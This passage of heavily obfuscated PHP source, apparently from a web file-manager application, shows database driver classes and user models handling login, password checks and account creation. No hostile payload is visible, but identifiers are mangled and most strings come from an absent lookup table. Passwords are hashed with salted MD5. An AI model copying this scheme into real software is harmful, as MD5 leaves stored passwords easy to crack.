$ıü¹Ûª[1012]; } $ÂÜŒå³£ .= $ıü¹Ûª[1020] . implode($ıü¹Ûª[60], $·ôÈ¹üÙ); } return $this->execute($ÂÜŒå³£); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $«¬³µÄÙ =& $_SERVER[‰‰Ş‚€]; $this->error = mysql_errno() . $«¬³µÄÙ[14] . mysql_error($this->_linkID); if ($«¬³µÄÙ[22] != $this->queryStr) { $this->error .= LNG($«¬³µÄÙ[58]) . $this->queryStr; } think_trace($this->error, $«¬³µÄÙ[22], $«¬³µÄÙ[59]); return $this->error; } public function escapeString($ÎôÑáË) { if ($this->_linkID) { return mysql_real_escape_string($ÎôÑáË, $this->_linkID); } else { return mysql_escape_string($ÎôÑáË); } } public function parseKey(&$õÑÅæ’Œ, $é’Ş“ = true) { $¼ÕÕ£áÒ =& $_SERVER[‰‰Ş‚€]; if ($é’Ş“) { $õÑÅæ’Œ = $this->parseKeyCheck($õÑÅæ’Œ); } if ($õÑÅæ’Œ != $¼ÕÕ£áÒ[231] && !preg_match($¼ÕÕ£áÒ[1021], $õÑÅæ’Œ)) { $õÑÅæ’Œ = $¼ÕÕ£áÒ[480] . trim($õÑÅæ’Œ, $¼ÕÕ£áÒ[480]) . $¼ÕÕ£áÒ[480]; } return $õÑÅæ’Œ; } } class DbMysqli extends Db { public function __construct($š¤Ôº = '') { $ é¡Ù¶ =& $_SERVER[‰‰Ş‚€]; if (!extension_loaded($ é¡Ù¶[1022])) { think_exception(think_lang($ é¡Ù¶[24]) . $ é¡Ù¶[1023]); } if (!empty($š¤Ôº)) { $this->config = $š¤Ôº; if (empty($this->config[$ é¡Ù¶[27]])) { $this->config[$ é¡Ù¶[27]] = $ é¡Ù¶[22]; } } } public function connect($½¶É°’ = '', $ªùÌÍÆô = 0) { $áÁÏùŒ =& $_SERVER[‰‰Ş‚€]; if (!isset($this->linkID[$ªùÌÍÆô])) { if (empty($½¶É°’)) { $½¶É°’ = $this->config; } $this->linkID[$ªùÌÍÆô] = new mysqli($½¶É°’[$áÁÏùŒ[993]], $½¶É°’[$áÁÏùŒ[995]], $½¶É°’[$áÁÏùŒ[996]], $½¶É°’[$áÁÏùŒ[31]], $½¶É°’[$áÁÏùŒ[994]] ? intval($½¶É°’[$áÁÏùŒ[994]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¥ íàÖŒ = $this->linkID[$ªùÌÍÆô]->server_version; $this->linkID[$ªùÌÍÆô]->query($áÁÏùŒ[997] . think_config($áÁÏùŒ[998]) . $áÁÏùŒ[68]); if ($¥ íàÖŒ > $áÁÏùŒ[999]) { $this->linkID[$ªùÌÍÆô]->query($áÁÏùŒ[1000]); } $this->connected = !0; if (1 != think_config($áÁÏùŒ[32])) { unset($this->config); } } return $this->linkID[$ªùÌÍÆô]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($å†¤”³) { $ÔëÓ×üº =& $_SERVER[‰‰Ş‚€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $å†¤”³; if ($this->queryID) { $this->free(); } think_action_status($ÔëÓ×üº[33], 1); think_status($ÔëÓ×üº[34]); $this->queryID = $this->_linkID->query($å†¤”³); if ($this->_linkID->more_results()) { while (($¢›Ãüß¶ = $this->_linkID->next_result()) != NULL) { $¢›Ãüß¶->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Ì™ñ‰ë) { $ğ†İ”ûš =& $_SERVER[‰‰Ş‚€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ì™ñ‰ë; if ($this->queryID) { $this->free(); } think_action_status($ğ†İ”ûš[35], 1); think_status($ğ†İ”ûš[34]); $Å¡£…ı = $this->_linkID->query($Ì™ñ‰ë); $this->debug(); if (!1 === $Å¡£…ı) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $šÎ®» é = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$šÎ®» é) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $—ß¥¸‹ç = $this->_linkID->rollback(); $this->transTimes = 0; if (!$—ß¥¸‹ç) { $this->error(); return !1; } } return !0; } private function getAll() { $­úîÀü÷ = array(); if ($this->numRows > 0) { for ($ˆ³ÃÍÏ  = 0; $ˆ³ÃÍÏ  < $this->numRows; $ˆ³ÃÍÏ ++) { $­úîÀü÷[$ˆ³ÃÍÏ ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $­úîÀü÷; } public function getFields($ğõù†) { $¦ßĞ¹Ç =& $_SERVER[‰‰Ş‚€]; $ÚŠÛÁáš = $this->query($¦ßĞ¹Ç[1004] . $this->parseKey($ğõù†)); $»œ«ŸÛî = array(); if ($ÚŠÛÁáš) { foreach ($ÚŠÛÁáš as $´Ö‡‚®„ => $Ö‚Åú•«) { $»œ«ŸÛî[$Ö‚Åú•«[$¦ßĞ¹Ç[41]]] = array($¦ßĞ¹Ç[42] => $Ö‚Åú•«[$¦ßĞ¹Ç[41]], $¦ßĞ¹Ç[43] => $Ö‚Åú•«[$¦ßĞ¹Ç[44]], $¦ßĞ¹Ç[45] => (bool) ($Ö‚Åú•«[$¦ßĞ¹Ç[46]] === $¦ßĞ¹Ç[22]), $¦ßĞ¹Ç[47] => $Ö‚Åú•«[$¦ßĞ¹Ç[48]], $¦ßĞ¹Ç[49] => strtolower($Ö‚Åú•«[$¦ßĞ¹Ç[50]]) == $¦ßĞ¹Ç[51], $¦ßĞ¹Ç[52] => strtolower($Ö‚Åú•«[$¦ßĞ¹Ç[53]]) == $¦ßĞ¹Ç[54]); } } return $»œ«ŸÛî; } public function getTables($ô¹ŠÏéñ = '') { $ò«Îóõ =& $_SERVER[‰‰Ş‚€]; $ËãÏÏÁä = !empty($ô¹ŠÏéñ) ? $ò«Îóõ[1006] . $ô¹ŠÏéñ . $ò«Îóõ[1007] : $ò«Îóõ[1008]; $šã—ë = $this->query($ËãÏÏÁä); $¤‚ƒ¤ªğ = array(); if ($šã—ë) { foreach ($šã—ë as $Â¿ïö·á => $”µ¤„·õ) { $¤‚ƒ¤ªğ[$Â¿ïö·á] = current($”µ¤„·õ); } } return $¤‚ƒ¤ªğ; } public function replace($¿ÅáŞæé, $ÂÑ“íã = array()) { $‰Ø†ƒ© =& $_SERVER[‰‰Ş‚€]; foreach ($¿ÅáŞæé as $îŸŒ¯›ï => $—›Şöü) { $Şù„€Ã· = $this->parseValue($—›Şöü); if (is_scalar($Şù„€Ã·)) { $‚ûÉô‚¦[] = $Şù„€Ã·; $ğÄ²–°§[] = $this->parseKey($îŸŒ¯›ï); } } $ºˆ©Šú = $‰Ø†ƒ©[1009] . $this->parseTable($ÂÑ“íã[$‰Ø†ƒ©[366]]) . $‰Ø†ƒ©[1010] . implode($‰Ø†ƒ©[60], $ğÄ²–°§) . $‰Ø†ƒ©[1011] . implode($‰Ø†ƒ©[60], $‚ûÉô‚¦) . $‰Ø†ƒ©[1012]; return $this->execute($ºˆ©Šú); } public function insertAll($ê¦¸‘Äô, $ë§Ä®¨ = array(), $÷õâ®ÃÄ = false) { $èâÊ’æ =& $_SERVER[‰‰Ş‚€]; if (!is_array($ê¦¸‘Äô[0])) { return !1; } $ì¿Ÿ€Ö = array_keys($ê¦¸‘Äô[0]); $æÙò„ûŠ = array(); foreach ($ê¦¸‘Äô as $ĞóÖ¿Áı) { $™Åş‘æÏ = array(); foreach ($ĞóÖ¿Áı as $ÊÌ¯•øï => $¿à½œŞ®) { $¿à½œŞ® = $this->parseValue($¿à½œŞ®); if (is_scalar($¿à½œŞ®)) { $™Åş‘æÏ[] = $¿à½œŞ®; } } $æÙò„ûŠ[] = $èâÊ’æ[347] . implode($èâÊ’æ[60], $™Åş‘æÏ) . $èâÊ’æ[1012]; } array_walk($ì¿Ÿ€Ö, array($this, $èâÊ’æ[1013])); $ÄñŸ„üÖ = $÷õâ®ÃÄ ? $èâÊ’æ[1014] : $èâÊ’æ[1015]; $ÄñŸ„üÖ = $èâÊ’æ[1015]; $±¼Çœ¦ = $ÄñŸ„üÖ . $èâÊ’æ[1016] . $this->parseTable($ë§Ä®¨[$èâÊ’æ[366]]) . $èâÊ’æ[1010] . implode($èâÊ’æ[60], $ì¿Ÿ€Ö) . $èâÊ’æ[1017] . implode($èâÊ’æ[60], $æÙò„ûŠ); if ($÷õâ®ÃÄ) { $ÍÏê­ı¿ = array(); foreach ($ì¿Ÿ€Ö as $ÊÌ¯•øï) { if ($ÊÌ¯•øï == $èâÊ’æ[242] || $ÊÌ¯•øï == $èâÊ’æ[1018]) { continue; } $ÍÏê­ı¿[] = $ÊÌ¯•øï . $èâÊ’æ[1019] . $ÊÌ¯•øï . $èâÊ’æ[1012]; } $±¼Çœ¦ .= $èâÊ’æ[1020] . implode($èâÊ’æ[60], $ÍÏê­ı¿); } return $this->execute($±¼Çœ¦); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $åï±„ı² =& $_SERVER[‰‰Ş‚€]; $this->error = $this->_linkID->errno . $åï±„ı²[14] . $this->_linkID->error; if ($åï±„ı²[22] != $this->queryStr) { $this->error .= LNG($åï±„ı²[58]) . $this->queryStr; } think_trace($this->error, $åï±„ı²[22], $åï±„ı²[59]); return $this->error; } public function escapeString($¾¤¶À¤°) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¾¤¶À¤°); } else { return addslashes($¾¤¶À¤°); } } public function parseKey(&$€ÊÆÃ¡æ, $Â¸úÃİ‡ = true) { $âõæİ¾† =& $_SERVER[‰‰Ş‚€]; if ($Â¸úÃİ‡) { $€ÊÆÃ¡æ = $this->parseKeyCheck($€ÊÆÃ¡æ); } if ($€ÊÆÃ¡æ != $âõæİ¾†[231] && !preg_match($âõæİ¾†[1021], $€ÊÆÃ¡æ)) { $€ÊÆÃ¡æ = $âõæİ¾†[480] . trim($€ÊÆÃ¡æ, $âõæİ¾†[480]) . $âõæİ¾†[480]; } return $€ÊÆÃ¡æ; } } goto b‡æäÒÄ¯ó; CŸ¿— ç”: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\152\x6f\x62\x4c\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x64\x65\163\x63", "\163\157\x72\x74"); const JOB_KEY = "\163\145\154\146\x4a\157\x62\114\151\163\164"; public function listData($÷ğ÷¬¨ø = false, $„èïªµ‹ = "\163\157\x72\164", $µ“úÚÉÄ = false) { return parent::listData($÷ğ÷¬¨ø, $„èïªµ‹, $µ“úÚÉÄ); } public function remove($²ÔˆÕÄ) { return parent::remove($²ÔˆÕÄ); } public function add($ÃÓ†‹¡«) { $ƒ Íñ† =& $_SERVER[‰‰Ş‚€]; if ($this->findByName($ÃÓ†‹¡«[$ƒ Íñ†[42]])) { return !1; } $ÃÓ†‹¡«[$ƒ Íñ†[2044]] = $this->getSort(); return parent::insert($ÃÓ†‹¡«); } private function getSort() { $İĞ²ªÂ =& $_SERVER[‰‰Ş‚€]; $×»ãìç× = parent::listData(); $ëê»ì…á = array_to_keyvalue($×»ãìç×, $İĞ²ªÂ[22], $İĞ²ªÂ[2044]); return empty($ëê»ì…á) ? 0 : max($ëê»ì…á) + 1; } public function update($Öõ‘‘¨ô, $¯Úì•¢) { $²ÄÄ–Ñ£ =& $_SERVER[‰‰Ş‚€]; $äÄØ¢ = parent::listData($Öõ‘‘¨ô); $‘¸Ì¬ÁË = $this->findByName($¯Úì•¢[$²ÄÄ–Ñ£[42]]); if (!$äÄØ¢ || $‘¸Ì¬ÁË && $‘¸Ì¬ÁË[$²ÄÄ–Ñ£[491]] != $äÄØ¢[$²ÄÄ–Ñ£[491]]) { return !1; } return parent::update($Öõ‘‘¨ô, $¯Úì•¢); } public function setUserJob($»ËÍª•´, $¤çöüë) { $˜³óÓŠ =& $_SERVER[‰‰Ş‚€]; if (!is_array($¤çöüë)) { $¤çöüë = array($¤çöüë); } $•£´»™õ = parent::listData(); $¡“…‰¢¹ = array_to_keyvalue($•£´»™õ, $˜³óÓŠ[42]); $šÓ·ş—® = $˜³óÓŠ[471]; foreach ($¤çöüë as $Áü¸öÅ„) { if ($¡“…‰¢¹[$Áü¸öÅ„]) { $šÓ·ş—® .= $¡“…‰¢¹[$Áü¸öÅ„][$˜³óÓŠ[491]] . $˜³óÓŠ[60]; } else { $ÀïŒ‹×­ = $this->add($Áü¸öÅ„); $šÓ·ş—® .= $ÀïŒ‹×­ . $˜³óÓŠ[60]; } } $šÓ·ş—® = rtrim($šÓ·ş—®, $˜³óÓŠ[60]); Model($˜³óÓŠ[617])->metaSet($»ËÍª•´, self::JOB_KEY, $šÓ·ş—®); } public function getUserJob($âÏ—èŸø) { $¼ÙãıÊ§ = Model($_SERVER[‰‰Ş‚€][617])->metaGet($âÏ—èŸø); return $this->getUserJobInfo($¼ÙãıÊ§[self::JOB_KEY]); } public function getUserJobInfo($µŒæƒÑ) { $³·Ğ¨î÷ =& $_SERVER[‰‰Ş‚€]; $Œë­½ú£ = explode($³·Ğ¨î÷[60], $µŒæƒÑ); $Çæúªê = parent::listData(); $Çæúªê = array_remove_key($Çæúªê, $³·Ğ¨î÷[242]); $Á…ÉÍ¡ = array(); foreach ($Œë­½ú£ as $¬„œ‘¬±) { if (isset($Çæúªê[$¬„œ‘¬±])) { $Á…ÉÍ¡[] = $Çæúªê[$¬„œ‘¬±]; } } return $Á…ÉÍ¡; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\x61\x6d\145" => "\165\163\x65\162\x5f\155\145\164\x61", "\x6d\x65\164\x61\106\151\x65\154\x64" => "\165\163\145\162\111\x44"); protected $simpleField = "\165\163\145\162\x49\104\54\x6e\x69\x63\153\x4e\x61\155\145\54\156\141\155\x65\x2c\141\166\x61\x74\141\162\54\163\x65\x78\x2c\x73\x74\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($§êÍÄ‘œ) { $™ã‡éÃË =& $_SERVER[‰‰Ş‚€]; $ï–êáù† = $™ã‡éÃË[2527]; return array($™ã‡éÃË[2102] => array($§êÍÄ‘œ[0], $ï–êáù†), $™ã‡éÃË[2104] => array($§êÍÄ‘œ[0], $ï–êáù†), $™ã‡éÃË[2528] => array($§êÍÄ‘œ[0], $ï–êáù†)); } protected function getInfo($›â–ÀıĞ, $ºÚ»ÏÊœ = false) { $àÜÃ€ŸŒ = $this->getInfoSimple($›â–ÀıĞ); if (!is_array($àÜÃ€ŸŒ)) { return array(); } if ($ºÚ»ÏÊœ) { return $this->_getInfoApply($àÜÃ€ŸŒ); } return $this->cacheFunctionGet($_SERVER[‰‰Ş‚€][2106], $›â–ÀıĞ); } protected function getInfoFull($ıµ†Ç÷à, $©¸¨Ã‡¼ = false) { $äÌ“½˜Ë = $this->getInfoSimple($ıµ†Ç÷à); if (!is_array($äÌ“½˜Ë)) { return array(); } if ($©¸¨Ã‡¼) { return $this->_getInfoApply($äÌ“½˜Ë, !0); } return $this->cacheFunctionGet($_SERVER[‰‰Ş‚€][2529], $ıµ†Ç÷à); } private function _getInfoApply($Á“Ö£–, $êî©Úì = false) { $üîœÊÉÍ =& $_SERVER[‰‰Ş‚€]; if (!$Á“Ö£–) { return $Á“Ö£–; } $î®™ô“Å = md5($üîœÊÉÍ[2530] . $Á“Ö£–[$üîœÊÉÍ[996]] . $üîœÊÉÍ[2531] . $Á“Ö£–[$üîœÊÉÍ[42]]); $Á“Ö£– = $this->_listDataApplyItem($Á“Ö£–); $²âÊ‡×š = Model($üîœÊÉÍ[1467])->metaGet($Á“Ö£–[$üîœÊÉÍ[100]][$üîœÊÉÍ[202]]); $Á“Ö£–[$üîœÊÉÍ[2532]] = $î®™ô“Å; $Á“Ö£–[$üîœÊÉÍ[100]][$üîœÊÉÍ[2314]] = isset($²âÊ‡×š[$üîœÊÉÍ[2315]]) ? $²âÊ‡×š[$üîœÊÉÍ[2315]] : null; if ($êî©Úì) { $Á“Ö£–[$üîœÊÉÍ[559]] = $this->metaGet($Á“Ö£–[$üîœÊÉÍ[1820]]); } return $Á“Ö£–; } protected function getInfoSimple($ŸĞıÒÂŸ, $ºŠ¿ÍÕ¬ = false) { $áÙ§–¢Ï =& $_SERVER[‰‰Ş‚€]; if (!$ŸĞıÒÂŸ) { return array(); } if ($ºŠ¿ÍÕ¬) { $¦›Ó¤ = $this->where(array($áÙ§–¢Ï[1820] => intval($ŸĞıÒÂŸ)))->find(); if (!is_array($¦›Ó¤)) { return array(); } $¦›Ó¤[$áÙ§–¢Ï[2220]] = Action($áÙ§–¢Ï[2221])->parseUrl($¦›Ó¤[$áÙ§–¢Ï[2220]]); return $¦›Ó¤; } return $this->cacheFunctionGet($áÙ§–¢Ï[2107], $ŸĞıÒÂŸ); } protected function getInfoSimpleOuter($„·¬¿µ…) { $èÆ¤»´° =& $_SERVER[‰‰Ş‚€]; if (!$„·¬¿µ… || $„·¬¿µ… == 0) { return array($èÆ¤»´°[1820] => $èÆ¤»´°[239], $èÆ¤»´°[42] => $èÆ¤»´°[184] . LNG($èÆ¤»´°[2533]) . $èÆ¤»´°[186], $èÆ¤»´°[2220] => STATIC_PATH . $èÆ¤»´°[2534]); } $É±…Ë„½ = $this->cacheFunctionGet($èÆ¤»´°[2107], $„·¬¿µ…); $•”½à = array_field_key($É±…Ë„½, explode($èÆ¤»´°[60], $this->simpleField)); if (!$•”½à) { return array($èÆ¤»´°[1820] => $èÆ¤»´°[1312], $èÆ¤»´°[42] => $èÆ¤»´°[184] . LNG($èÆ¤»´°[2535]) . $èÆ¤»´°[186], $èÆ¤»´°[2220] => STATIC_PATH . $èÆ¤»´°[2536]); } $•”½à[$èÆ¤»´°[2220]] = Action($èÆ¤»´°[2221])->parseUrl($•”½à[$èÆ¤»´°[2220]]); return $•”½à; } protected function groupUser($‰²­ğÎ’) { } public static function errorLang($Âö¬êúØ) { $ÆëòùŞ =& $_SERVER[‰‰Ş‚€]; $€ê‡¨ = array(self::ERROR_USER_NOT_EXISTS => $ÆëòùŞ[2537], self::ERROR_USER_PASSWORD_ERROR => $ÆëòùŞ[2538], self::ERROR_USER_EXIST_NAME => $ÆëòùŞ[2539], self::ERROR_USER_EXIST_PHONE => $ÆëòùŞ[2540], self::ERROR_USER_EXIST_EMAIL => $ÆëòùŞ[2541], self::ERROR_USER_LOGIN_LOCK => $ÆëòùŞ[2542], self::ERROR_IP_NOT_ALLOW => $ÆëòùŞ[2543], self::ERROR_USER_EXIST_NICKNAME => $ÆëòùŞ[2544]); $—ğ¸Åıü = LNG($€ê‡¨[$Âö¬êúØ]); if ($Âö¬êúØ == self::ERROR_USER_LOGIN_LOCK) { $¸µÊó³ = (int) Model($ÆëòùŞ[1423])->get($ÆëòùŞ[2545]); if ($¸µÊó³ > 60) { $—ğ¸Åıü = str_replace($ÆëòùŞ[101], ceil($¸µÊó³ / 60), $—ğ¸Åıü); } } return $—ğ¸Åıü; } protected function metaSet($†Ã’‰û«, $¡©Ş›™¨ = null, $Ò°™§Ë = null) { $this->clearCache($†Ã’‰û«); return parent::metaSet($†Ã’‰û«, $¡©Ş›™¨, $Ò°™§Ë); } public function getInfoByMeta($ÚÖ×²±É, $ä¥Š÷Êé) { $Ä§©ÀÍº =& $_SERVER[‰‰Ş‚€]; $É±ıÜÎ† = Model($Ä§©ÀÍº[2546])->where(array($Ä§©ÀÍº[105] => $ÚÖ×²±É, $Ä§©ÀÍº[459] => $ä¥Š÷Êé))->find(); if ($É±ıÜÎ†) { return $this->getInfo($É±ıÜÎ†[$Ä§©ÀÍº[1820]]); } return !1; } public function userLoginCheck($ÉÏ…ŸÃ›, $êê³”Æ, $òûŸÂ–¬ = false) { $ÚÓåÇ¶ =& $_SERVER[‰‰Ş‚€]; $ù²ƒêÜ• = $this->userLoginFind($ÉÏ…ŸÃ›); if (!$ù²ƒêÜ•) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ù²ƒêÜ•[$ÚÓåÇ¶[1820]], $êê³”Æ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $òûŸÂ–¬ ? $this->getInfoFull($ù²ƒêÜ•[$ÚÓåÇ¶[1820]]) : $this->getInfo($ù²ƒêÜ•[$ÚÓåÇ¶[1820]]); } public function userLoginFind($¸‰Ó·ˆÂ) { $áÙÏÆü— =& $_SERVER[‰‰Ş‚€]; $©Ÿ¹ú¡Í = array($áÙÏÆü—[42] => $¸‰Ó·ˆÂ, $áÙÏÆü—[2327] => $¸‰Ó·ˆÂ, $áÙÏÆü—[389] => $¸‰Ó·ˆÂ, $áÙÏÆü—[2547] => $¸‰Ó·ˆÂ, $áÙÏÆü—[1110] => $áÙÏÆü—[1112]); if ($this->nickNameRpt()) { unset($©Ÿ¹ú¡Í[$áÙÏÆü—[2327]]); } return $this->where($©Ÿ¹ú¡Í)->find(); } public function clearCache($¸¾Šà…ı) { $’¾¾ÙÅó =& $_SERVER[‰‰Ş‚€]; $this->cacheFunctionClear($’¾¾ÙÅó[2106], $¸¾Šà…ı); $this->cacheFunctionClear($’¾¾ÙÅó[2107], $¸¾Šà…ı); $this->cacheFunctionClear($’¾¾ÙÅó[2529], $¸¾Šà…ı); } public function userPasswordCheck($ø“ìÔÇÊ, $Î˜†éùñ) { $š±¤ı¯˜ =& $_SERVER[‰‰Ş‚€]; $È¦Ö«Ğ¹ = $this->where(array($š±¤ı¯˜[1820] => intval($ø“ìÔÇÊ)))->find(); $•ø÷åà = $this->metaGet($ø“ìÔÇÊ); $æœî¢ƒé = isset($•ø÷åà[$š±¤ı¯˜[2548]]) ? $•ø÷åà[$š±¤ı¯˜[2548]] : $š±¤ı¯˜[22]; if (md5($æœî¢ƒé . trim($Î˜†éùñ)) !== $È¦Ö«Ğ¹[$š±¤ı¯˜[996]]) { return !1; } return !0; } public function userAdd($§ÒæÖºİ) { $İã”ˆ’… =& $_SERVER[‰‰Ş‚€]; $›üóÓÃ‚ = array($İã”ˆ’…[513] => $§ÒæÖºİ[$İã”ˆ’…[42]], $İã”ˆ’…[2549] => $§ÒæÖºİ[$İã”ˆ’…[2219]], $İã”ˆ’…[2550] => isset($§ÒæÖºİ[$İã”ˆ’…[389]]) ? $§ÒæÖºİ[$İã”ˆ’…[389]] : $İã”ˆ’…[22], $İã”ˆ’…[2551] => isset($§ÒæÖºİ[$İã”ˆ’…[2547]]) ? $§ÒæÖºİ[$İã”ˆ’…[2547]] : $İã”ˆ’…[22], $İã”ˆ’…[2552] => isset($§ÒæÖºİ[$İã”ˆ’…[2327]]) ? $§ÒæÖºİ[$İã”ˆ’…[2327]] : $§ÒæÖºİ[$İã”ˆ’…[42]], $İã”ˆ’…[2553] => isset($§ÒæÖºİ[$İã”ˆ’…[2220]]) ? $§ÒæÖºİ[$İã”ˆ’…[2220]] : $İã”ˆ’…[22], $İã”ˆ’…[2554] => isset($§ÒæÖºİ[$İã”ˆ’…[2555]]) ? $§ÒæÖºİ[$İã”ˆ’…[2555]] : 1, $İã”ˆ’…[2556] => $§ÒæÖºİ[$İã”ˆ’…[996]], $İã”ˆ’…[2108] => isset($§ÒæÖºİ[$İã”ˆ’…[2007]]) ? $§ÒæÖºİ[$İã”ˆ’…[2007]] : 1024 * 1024 * 20, $İã”ˆ’…[2109] => 0, $İã”ˆ’…[2557] => 0, $İã”ˆ’…[2153] => isset($§ÒæÖºİ[$İã”ˆ’…[846]]) ? $§ÒæÖºİ[$İã”ˆ’…[846]] : 1); if (!empty($§ÒæÖºİ[$İã”ˆ’…[1820]])) { $›üóÓÃ‚[$İã”ˆ’…[1820]] = $§ÒæÖºİ[$İã”ˆ’…[1820]]; } $ñ‘¸‰‚” = $this->_checkExist($§ÒæÖºİ); if ($ñ‘¸‰‚” !== !0) { return $ñ‘¸‰‚”; } if (!empty($›üóÓÃ‚[$İã”ˆ’…[2220]]) && strlen($›üóÓÃ‚[$İã”ˆ’…[2220]]) > 255) { $›üóÓÃ‚[$İã”ˆ’…[2220]] = $İã”ˆ’…[22]; } $¿¯üÄÒÑ = $this->add($›üóÓÃ‚); $¶ã€—¨¥ = array($İã”ˆ’…[2556] => $›üóÓÃ‚[$İã”ˆ’…[996]], $İã”ˆ’…[2552] => $›üóÓÃ‚[$İã”ˆ’…[2327]], $İã”ˆ’…[2558] => $§ÒæÖºİ[$İã”ˆ’…[2113]]); $this->userEdit($¿¯üÄÒÑ, $¶ã€—¨¥); Model($İã”ˆ’…[1467])->userRootAdd($¿¯üÄÒÑ); return $¿¯üÄÒÑ; } protected function userEditTest($™¸§ù¡, $ĞÊ‰¿Áù) { return $this->call($_SERVER[‰‰Ş‚€][2559], $™¸§ù¡, $ĞÊ‰¿Áù); } protected function userEdit($³¨¹âˆ”, $á‘ ‘¾Ù) { $²®Å¹Íº =& $_SERVER[‰‰Ş‚€]; $÷«Ì÷Èş = $this->getInfoSimple($³¨¹âˆ”); if (!$÷«Ì÷Èş) { return !1; } $Ù„ìÓ¯ = $this->_checkExist($á‘ ‘¾Ù, $³¨¹âˆ”); if ($Ù„ìÓ¯ !== !0) { return $Ù„ìÓ¯; } if (isset($á‘ ‘¾Ù[$²®Å¹Íº[996]]) && trim($á‘ ‘¾Ù[$²®Å¹Íº[996]]) != $²®Å¹Íº[22]) { $â¬¶‡Ò = $this->metaGet($³¨¹âˆ”); if (empty($â¬¶‡Ò[$²®Å¹Íº[2548]])) { $â¬¶‡Ò[$²®Å¹Íº[2548]] = rand_string(10); Model($²®Å¹Íº[597])->metaSet($³¨¹âˆ”, $²®Å¹Íº[2548], $â¬¶‡Ò[$²®Å¹Íº[2548]]); } $á‘ ‘¾Ù[$²®Å¹Íº[996]] = md5($â¬¶‡Ò[$²®Å¹Íº[2548]] . trim($á‘ ‘¾Ù[$²®Å¹Íº[996]])); } else { unset($á‘ ‘¾Ù[$²®Å¹Íº[996]]); } if (!empty($á‘ ‘¾Ù[$²®Å¹Íº[2220]]) && strlen($á‘ ‘¾Ù[$²®Å¹Íº[2220]]) > 255) { $á‘ ‘¾Ù[$²®Å¹Íº[2220]] = $²®Å¹Íº[22]; } if (isset($á‘ ‘¾Ù[$²®Å¹Íº[2327]])) { $this->setNamePinyin($³¨¹âˆ”, $á‘ ‘¾Ù[$²®Å¹Íº[2327]]); } if (isset($á‘ ‘¾Ù[$²®Å¹Íº[2113]])) { $àˆ§ãì = $²®Å¹Íº[1426] . $³¨¹âˆ”; $áØÈ½“À = $²®Å¹Íº[1424]; $Ã´ÈÚ‡ = $á‘ ‘¾Ù[$²®Å¹Íº[2113]] ? $á‘ ‘¾Ù[$²®Å¹Íº[2113]] : $²®Å¹Íº[22]; $•Ä½Áœ = Model($²®Å¹Íº[1423])->get($àˆ§ãì, $áØÈ½“À); $•Ä½Áœ = $•Ä½Áœ ? $•Ä½Áœ : $²®Å¹Íº[22]; if ($•Ä½Áœ != $Ã´ÈÚ‡) { if (!$Ã´ÈÚ‡ && $•Ä½Áœ) { Model($²®Å¹Íº[1423])->remove($àˆ§ãì, $áØÈ½“À); } else { if ($Ã´ÈÚ‡) { Model($²®Å¹Íº[1423])->set($àˆ§ãì, $Ã´ÈÚ‡, $áØÈ½“À); } } } unset($á‘ ‘¾Ù[$²®Å¹Íº[2113]]); Model($²®Å¹Íº[617])->metaSet($³¨¹âˆ”, $²®Å¹Íº[2113], $Ã´ÈÚ‡); } if (empty($á‘ ‘¾Ù)) { return !0; } $this->where(array($²®Å¹Íº[1811] => $³¨¹âˆ”))->save($á‘ ‘¾Ù); $this->clearCache($³¨¹âˆ”); return !0; } public function setNamePinyin($¸ƒÄ«¶è, $…Ïª—´Ü = false) { $»àú¶ºÍ =& $_SERVER[‰‰Ş‚€]; if (!$…Ïª—´Ü) { $´ç ‰‹À = $this->getInfoSimple($¸ƒÄ«¶è); $…Ïª—´Ü = $´ç ‰‹À[$»àú¶ºÍ[2327]] ? $´ç ‰‹À[$»àú¶ºÍ[2327]] : $´ç ‰‹À[$»àú¶ºÍ[42]]; } $À©ª’à = Model($»àú¶ºÍ[617]); if (!Input::check($…Ïª—´Ü, $»àú¶ºÍ[678])) { return $À©ª’à->metaSet($¸ƒÄ«¶è, array($»àú¶ºÍ[556] => $»àú¶ºÍ[22], $»àú¶ºÍ[555] => $»àú¶ºÍ[22])); } return $À©ª’à->metaSet($¸ƒÄ«¶è, array($»àú¶ºÍ[556] => str_replace($»àú¶ºÍ[63], $»àú¶ºÍ[22], Pinyin::get($…Ïª—´Ü)), $»àú¶ºÍ[555] => Pinyin::get($…Ïª—´Ü, $»àú¶ºÍ[679]))); } private function nickNameRpt() { $¼¬ñ“™  =& $_SERVER[‰‰Ş‚€]; $É–«²İÇ = Model($¼¬ñ“™ [869])->get($¼¬ñ“™ [2560]); $…ºÊÛÊÈ = $GLOBALS[$¼¬ñ“™ [16]][$¼¬ñ“™ [476]][$¼¬ñ“™ [2560]]; $”Àšç = !is_null($É–«²İÇ) 